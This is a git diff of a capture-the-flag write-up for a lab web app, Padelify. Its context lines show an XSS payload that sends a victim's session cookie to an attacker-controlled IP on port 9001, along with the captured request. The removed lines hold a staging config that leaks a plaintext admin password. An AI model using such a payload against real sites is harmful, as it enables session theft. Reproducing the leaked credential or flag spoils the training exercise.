@@ -186,7 +186,7 @@ Task Completed
   
 - XSS<br>
 - <code><script>var i=new Image();i.src="http://xx.xx.xxx.xxx:9001/?c="+document["coo"+"kie"]</script></code><br>
-- <code>GET /?c=PHPSESSID=..........................</p>
+- <code>GET /?c=PHPSESSID=..........................</code></p>
 
 <img width="1319" height="259" alt="image" src="https://github.com/user-attachments/assets/62ca4e96-0ffb-4ab2-ae05-b91e4cdc921a" />
 
@@ -254,9 +254,8 @@ Found: [Status=400] [Length=335] [Word=reports list] http://xx.xx.xxx.xxx/live.p
 <img width="820" height="362" alt="image" src="https://github.com/user-attachments/assets/de4c7b94-a0d8-4854-9d2a-f6c0865a03a8" />
 
 
-bL}8,S9W1o44
-
-version = "1.4.2" enable_live_feed = true enable_signup = true env = "staging" site_name = "Padelify Tournament Portal" max_players_per_team = 4 maintenance_mode = false log_level = "INFO" log_retention_days = 30 db_path = "padelify.sqlite" admin_info = "bL}8,S9W1o44" misc_note = "do not expose to production" support_email = "support@padelify.thm" build_hash = "a1b2c3d4" 
+<br>
+<br>
 
 
 <img width="825" height="455" alt="image" src="https://github.com/user-attachments/assets/b4869dde-0fa9-4b42-9552-356fe1bdb425" />
@@ -276,7 +275,6 @@ version = "1.4.2" enable_live_feed = true enable_signup = true env = "staging" s
 <p>1.2. <em>What is the flag value after logging in as admin?</em><br>
 <code>THM{..................}</code></p>
 
-<img width="1896" height="877" alt="image" src="https://github.com/user-attachments/assets/3f4a4e47-9459-42f7-af27-bb0c2827bdf3" />
 
 <br>
 <br>
